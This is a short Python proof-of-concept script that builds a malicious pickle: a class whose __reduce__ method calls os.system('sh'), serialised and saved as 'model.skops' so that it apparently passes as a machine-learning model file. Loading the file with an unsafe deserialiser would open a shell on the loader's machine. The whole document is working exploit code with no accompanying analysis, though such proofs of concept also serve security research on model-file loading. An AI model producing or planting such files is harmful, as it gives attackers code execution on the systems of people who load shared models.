import pickle

class Provola:
    def __reduce__(self):
        import os
        return (os.system, ("sh",))

payload = pickle.dumps(Provola())

with open("model.skops", "wb") as f:
    f.write(payload)